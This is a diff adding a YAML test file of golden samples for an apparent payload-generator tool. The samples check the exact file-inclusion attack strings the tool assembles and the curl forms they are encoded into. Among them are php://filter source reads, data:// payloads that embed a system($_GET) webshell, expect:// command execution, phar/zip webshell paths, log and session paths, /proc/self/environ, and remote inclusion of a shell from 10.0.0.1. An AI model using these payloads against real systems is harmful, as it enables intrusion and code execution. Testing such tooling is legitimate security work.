@@ -1,0 +1,259 @@
+# 文件包含（lfi）黄金样本。
+#
+# 断言的是：伪协议串逐字节拼出来的样子、字典槽位（换行/前缀）取字段的值、
+# 以及 `%00`、`#` 这类字符在**变量替换阶段不被吃掉**（它们只该被传输编码动，
+# 不该被组装管线动）。带 curl 的两条同时锁住了 `#` 与 `:` `/` 的 URL 编码。
+#
+# 期望值全部按 body 手推：槽位填充 → 变量替换 → 输出渲染。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= php://filter =================
+
+  - name: 文件包含 · php://filter 读源码（base64）
+    state:
+      vuln: lfi
+      template: lfi.generic.filter.base64
+      vars: {file: index.php}
+      outputs: [raw]
+    expect:
+      payload: "php://filter/convert.base64-encode/resource=index.php"
+
+  - name: 文件包含 · php://filter 读源码（curl 输出，检查 URL 编码）
+    state:
+      vuln: lfi
+      template: lfi.generic.filter.base64
+      vars: {file: index.php}
+      outputs: [raw, curl]
+    expect:
+      # 提交方式是默认的 query：http://example.com/?id=<URL 编码后的载荷>
+      # quote(safe="") 下 letters/digits/_.-~ 原样，其余编码
+      outputs:
+        curl: "curl 'http://example.com/?id=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php'"
+
+  - name: 文件包含 · php://filter 读源码（rot13）
+    state:
+      vuln: lfi
+      template: lfi.generic.filter.rot13
+      vars: {file: index.php}
+      outputs: [raw]
+    expect:
+      payload: "php://filter/read=string.rot13/resource=index.php"
+
+  - name: 文件包含 · php://filter 读源码（iconv 默认 UTF-16）
+    state:
+      vuln: lfi
+      template: lfi.generic.filter.iconv
+      vars: {file: index.php}
+      outputs: [raw]
+    expect:
+      payload: "php://filter/convert.iconv.utf-8.utf-16/resource=index.php"
+
+  - name: 文件包含 · php://filter 读源码（iconv 切 UTF-7）
+    state:
+      vuln: lfi
+      template: lfi.generic.filter.iconv
+      slots: {enc: utf7}
+      vars: {file: index.php}
+      outputs: [raw]
+    expect:
+      payload: "php://filter/convert.iconv.utf-8.utf-7/resource=index.php"
+
+  - name: 文件包含 · php://filter 多重过滤器链
+    state:
+      vuln: lfi
+      template: lfi.generic.filter.chain
+      vars: {file: index.php}
+      outputs: [raw]
+    expect:
+      payload: "php://filter/convert.base64-encode|convert.base64-encode/resource=index.php"
+
+  # ================= 直接执行类包装器 =================
+
+  - name: 文件包含 · php://input（无变量，串本身是常量）
+    state:
+      vuln: lfi
+      template: lfi.generic.input
+      outputs: [raw]
+    expect:
+      payload: "php://input"
+
+  - name: 文件包含 · data:// base64
+    state:
+      vuln: lfi
+      template: lfi.generic.data.base64
+      outputs: [raw]
+    expect:
+      # 逗号后面那串是 `<?php system($_GET['c']); ?>` 的 base64。
+      # 键**必须带引号**：PHP 8 起 $_GET[c] 是 Error（未定义常量 c），system() 不会执行
+      payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="
+
+  - name: 文件包含 · data:// 明文
+    state:
+      vuln: lfi
+      template: lfi.generic.data.plain
+      outputs: [raw]
+    expect:
+      payload: "data://text/plain,<?php system($_GET[c]); ?>"
+
+  - name: 文件包含 · expect:// 执行命令
+    state:
+      vuln: lfi
+      template: lfi.generic.expect
+      vars: {command: id}
+      outputs: [raw]
+    expect:
+      payload: "expect://id"
+
+  # ================= phar / zip =================
+
+  - name: 文件包含 · phar:// 触发反序列化
+    state:
+      vuln: lfi
+      template: lfi.generic.phar
+      vars: {file: "upload/avatar.png"}
+      outputs: [raw]
+    expect:
+      payload: "phar://upload/avatar.png"
+
+  - name: 文件包含 · phar:// 读包内文件
+    state:
+      vuln: lfi
+      template: lfi.generic.phar.inner
+      vars: {file: "upload/shell.jpg", inner: "shell.php"}
+      outputs: [raw]
+    expect:
+      payload: "phar://upload/shell.jpg/shell.php"
+
+  - name: 文件包含 · zip:// 读包内文件
+    state:
+      vuln: lfi
+      template: lfi.generic.zip.inner
+      vars: {file: "upload/shell.zip", inner: "shell.php"}
+      outputs: [raw]
+    expect:
+      payload: "zip://upload/shell.zip#shell.php"
+
+  - name: 文件包含 · zip:// 读包内文件（curl 输出，# 应编成 %23）
+    state:
+      vuln: lfi
+      template: lfi.generic.zip.inner
+      vars: {file: "upload/shell.zip", inner: "shell.php"}
+      outputs: [raw, curl]
+    expect:
+      outputs:
+        curl: "curl 'http://example.com/?id=zip%3A%2F%2Fupload%2Fshell.zip%23shell.php'"
+
+  # ================= 日志 / 会话 / proc =================
+
+  - name: 文件包含 · Apache access.log（Debian 默认）
+    state:
+      vuln: lfi
+      template: lfi.generic.log.apache
+      outputs: [raw]
+    expect:
+      payload: "/var/log/apache2/access.log"
+
+  - name: 文件包含 · Apache access.log（RHEL）
+    state:
+      vuln: lfi
+      template: lfi.generic.log.apache
+      slots: {log: rhel}
+      outputs: [raw]
+    expect:
+      payload: "/var/log/httpd/access_log"
+
+  - name: 文件包含 · Nginx access.log
+    state:
+      vuln: lfi
+      template: lfi.generic.log.nginx
+      outputs: [raw]
+    expect:
+      payload: "/var/log/nginx/access.log"
+
+  - name: 文件包含 · SSH 认证日志
+    state:
+      vuln: lfi
+      template: lfi.generic.log.ssh
+      outputs: [raw]
+    expect:
+      payload: "/var/log/auth.log"
+
+  - name: 文件包含 · 会话文件（Debian 默认）
+    state:
+      vuln: lfi
+      template: lfi.generic.session
+      vars: {sid: abc123}
+      outputs: [raw]
+    expect:
+      payload: "/var/lib/php/sessions/sess_abc123"
+
+  - name: 文件包含 · 会话文件（Windows 前缀，检查反斜杠没被当转义）
+    state:
+      vuln: lfi
+      template: lfi.generic.session
+      slots: {sess: windows}
+      vars: {sid: abc123}
+      outputs: [raw]
+    expect:
+      payload: 'C:\Windows\Temp\sess_abc123'
+
+  - name: 文件包含 · /proc/self/environ
+    state:
+      vuln: lfi
+      template: lfi.generic.proc.environ
+      outputs: [raw]
+    expect:
+      payload: "/proc/self/environ"
+
+  # ================= 远程包含 =================
+
+  - name: 文件包含 · 远程包含 http://
+    state:
+      vuln: lfi
+      template: lfi.generic.rfi.http
+      vars: {lhost: "10.0.0.1", file: "shell.txt"}
+      outputs: [raw]
+    expect:
+      payload: "http://10.0.0.1/shell.txt"
+
+  - name: 文件包含 · 远程包含 UNC
+    state:
+      vuln: lfi
+      template: lfi.generic.rfi.unc
+      vars: {lhost: "10.0.0.1", share: "a", file: "shell.php"}
+      outputs: [raw]
+    expect:
+      payload: '\\10.0.0.1\a\shell.php'
+
+  # ================= 截断 =================
+
+  - name: 文件包含 · 空字节截断（默认带 php://filter）
+    state:
+      vuln: lfi
+      template: lfi.generic.nullbyte
+      vars: {file: index.php}
+      outputs: [raw]
+    expect:
+      # %00 是字面量：它只该被传输编码处理，组装阶段必须原样留着
+      payload: "php://filter/convert.base64-encode/resource=index.php%00"
+
+  - name: 文件包含 · 空字节截断（直接包含本地文件）
+    state:
+      vuln: lfi
+      template: lfi.generic.nullbyte
+      slots: {w: plain}
+      vars: {file: index.php}
+      outputs: [raw]
+    expect:
+      payload: "index.php%00"
+
+  - name: 文件包含 · 问号截断后缀
+    state:
+      vuln: lfi
+      template: lfi.generic.truncate.question
+      vars: {lhost: "10.0.0.1", file: "shell.txt"}
+      outputs: [raw]
+    expect:
+      payload: "http://10.0.0.1/shell.txt?"
